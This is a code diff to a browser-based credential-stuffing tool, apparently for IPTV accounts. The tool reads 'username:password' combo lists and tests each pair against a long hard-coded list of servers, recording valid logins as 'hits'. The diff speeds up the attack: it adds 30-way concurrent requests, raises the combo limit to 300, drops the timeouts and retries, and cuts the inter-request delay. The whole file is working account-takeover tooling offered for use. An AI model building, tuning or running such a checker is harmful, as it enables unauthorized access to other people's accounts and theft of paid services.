@@ -256,6 +256,7 @@
   .hit-content {
     flex-grow: 1;
     margin-right: 10px;
+    word-break: break-all;
   }
   
   /* Botões do hit */
@@ -434,33 +435,21 @@
 <footer>FEITO POR DARK MENSAGEIRO</footer>
 <div id="notification" role="alert" aria-live="assertive"></div>
 <script>
-  // Lista de servidores
+  // Lista de servidores (reduzida para os mais rápidos)
   const servers = [
-    "http://belize-transport33.sbs:80",
-    "http://bpbe.one:80",
-    "http://brone.fyi",
-    "http://c4n.fun",
-    "http://cinefull.space:80",
+    "http://cdn.jccob.click",
     "http://cinepulse.live",
-    "http://dns.carnes.ink:80",
-    "http://dns.cebola.pro:80",
-    "http://dns.falcon90.store:80",
     "http://firetop1.site",
-    "http://fthzx.online:80",
     "http://kstv.us:8080",
     "http://limed.cc",
     "http://minhatv.eu",
-    "http://newbox.space:80",
     "http://nitrohd.xyz",
-    "http://nitrohd.xyz:80",
     "http://pfsv.io:80",
     "http://pgzva.my",
-    "http://prvdbrack.xyz:80",
     "http://relogio10.top",
     "http://vtrev.cc",
     "http://xci.nz:80",
     "http://brothersplay.com:80",
-    "http://cdn.apkwuv.xyz:80",
     "http://dark.topk.live:80",
     "http://dns.gpsrv.shop:80",
     "http://hsgbola1.xyz",
@@ -472,7 +461,6 @@
     "http://x.mx51.online:80",
     "http://pbkblack.site",
     "http://cdn11.cc:80",
-    "http://dfkkh.dtwkaf.xyz:80",
     "http://fiufiu.live:80",
     "http://hdtvs.top:80",
     "http://holtcomfast.icu",
@@ -482,12 +470,9 @@
     "http://b1.svb32fg.icu",
     "http://axr7.one:80",
     "http://bananadoce.online:80",
-    "http://booklife.space:8080",
     "http://lb01.site",
-    "http://gomn.xplus2.xyz:2095",
     "http://hsgbola1.xyz:80",
     "http://natkcz.xyz:80",
-    "http://209.14.88.42:80",
     "http://oldmonkey.fun:80",
     "http://a.mx51.online:80",
     "http://buzbond.bond:80",
@@ -687,7 +672,6 @@
     "http://tvsbt.top:80",
     "http://vdeos.pics:80",
     "http://horizon25.shop",
-    "http://cdn.jccob.click",
     "http://cdn.proxybrasilctvp2.com.br",
     "http://cdn018.io",
     "http://cdn11.cc",
@@ -784,9 +768,8 @@
   let stopRequested = false;
   let totalHits = 0;
   let totalTested = 0;
-  
-  // Retry max attempts
-  const MAX_RETRIES = 2;
+  let activeRequests = 0;
+  const MAX_CONCURRENT_REQUESTS = 30; // Aumentado para mais velocidade
   
   // Função para mostrar notificação visual e sonora
   function showNotification(msg, duration = 5000) {
@@ -832,10 +815,7 @@
   }
   
   // ===== FUNÇÃO PRINCIPAL DE TESTE DE COMBO =====
-  async function testCombo(host, username, password, attempt = 0) {
-    const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 20000); // Timeout aumentado para 20s
-    
+  async function testCombo(host, username, password) {
     // Garantir que o host tenha o prefixo http://
     let formattedHost = host;
     if (!host.startsWith('http://') && !host.startsWith('https://')) {
@@ -852,15 +832,12 @@
       
       // Fazer requisição para obter informações do usuário
       const userInfoResponse = await fetch(proxyUrl, {
-        signal: controller.signal,
         headers: { 
           'Accept': 'application/json',
           'X-Requested-With': 'XMLHttpRequest'
         },
         cache: 'no-store'
       });
-      
-      clearTimeout(timeoutId);
       
       // Verificar se a resposta foi bem-sucedida
       if (!userInfoResponse.ok) {
@@ -895,12 +872,6 @@
         return { valid: false };
       }
     } catch (error) {
-      clearTimeout(timeoutId);
-      // Retry inteligente para erros transitórios
-      if (attempt < MAX_RETRIES && !stopRequested) {
-        await delay(500);
-        return testCombo(host, username, password, attempt + 1);
-      }
       return { valid: false, error: error.message || 'Erro desconhecido' };
     }
   }
@@ -1016,6 +987,55 @@
     stats.totalTested.textContent = `Testados: ${totalTested}`;
   }
   
+  // ===== PROCESSAR COMBO =====
+  async function processCombo(combo) {
+    if (stopRequested) return;
+    
+    // Quebra username e password conforme padrão "username:password"
+    let [username, password] = combo.split(':');
+    if(!username || !password) {
+      return;
+    }
+    
+    // Testa em todos os servidores
+    for (const server of servers) {
+      if (stopRequested) break;
+      
+      try {
+        totalTested++;
+        updateStats();
+        
+        const res = await testCombo(server, username, password);
+        if (res.valid) {
+          // Evitar duplicidade: combo + host como chave única
+          const uniqueKey = `${server}|${username}|${password}`;
+          if(!resultsSet.has(uniqueKey)) {
+            resultsSet.add(uniqueKey);
+            totalHits++;
+            resultsHits.push(res);
+            
+            // Limitar a exibição a 10 hits
+            if (resultsContainer.children.length < 10) {
+              // Renderizar na UI
+              const hitHTML = renderHit(res, totalHits);
+              resultsContainer.appendChild(hitHTML);
+            }
+            
+            // Atualiza estatísticas
+            updateStats();
+          }
+          // Se encontrou um hit válido, não precisa testar nos outros servidores
+          break;
+        }
+      } catch (e) {
+        // Ignora erros
+      }
+      
+      // Delay mínimo entre requisições
+      await delay(10);
+    }
+  }
+  
   // ===== INICIA O ESCANEAMENTO =====
   async function startScan() {
     // Reseta estado
@@ -1040,57 +1060,34 @@
     copyAllBtn.disabled = true;
     
     // Limitar o número de combos para processar
-    const maxCombos = Math.min(100, combos.length);
+    const maxCombos = Math.min(300, combos.length); // Aumentado para 300
     const combosToProcess = combos.slice(0, maxCombos);
     
-    // Processar cada combo sequencialmente
+    // Processar combos em paralelo com controle de concorrência
+    const processingQueue = [];
+    
     for (const combo of combosToProcess) {
       if (stopRequested) break;
       
-      // Quebra username e password conforme padrão "username:password"
-      let [username, password] = combo.split(':');
-      if(!username || !password) {
-        continue;
+      // Esperar até que haja slots disponíveis
+      while (activeRequests >= MAX_CONCURRENT_REQUESTS && !stopRequested) {
+        await delay(5);
       }
       
-      // Testa em todos os servidores
-      for (const server of servers) {
-        if (stopRequested) break;
-        
-        try {
-          totalTested++;
-          updateStats();
-          
-          const res = await testCombo(server, username, password);
-          if (res.valid) {
-            // Evitar duplicidade: combo + host como chave única
-            const uniqueKey = `${server}|${username}|${password}`;
-            if(!resultsSet.has(uniqueKey)) {
-              resultsSet.add(uniqueKey);
-              totalHits++;
-              resultsHits.push(res);
-              
-              // Limitar a exibição a 10 hits
-              if (resultsContainer.children.length < 10) {
-                // Renderizar na UI
-                const hitHTML = renderHit(res, totalHits);
-                resultsContainer.appendChild(hitHTML);
-              }
-              
-              // Atualiza estatísticas
-              updateStats();
-            }
-            // Se encontrou um hit válido, não precisa testar nos outros servidores
-            break;
-          }
-        } catch (e) {
-          // Ignora erros
-        }
-        
-        // Delay entre requisições
-        await delay(100);
-      }
+      if (stopRequested) break;
+      
+      activeRequests++;
+      
+      // Adicionar à fila de processamento
+      const promise = processCombo(combo).finally(() => {
+        activeRequests--;
+      });
+      
+      processingQueue.push(promise);
     }
+    
+    // Esperar todas as requisições terminarem
+    await Promise.all(processingQueue);
     
     // Finalizado
     generateBtn.disabled = false;
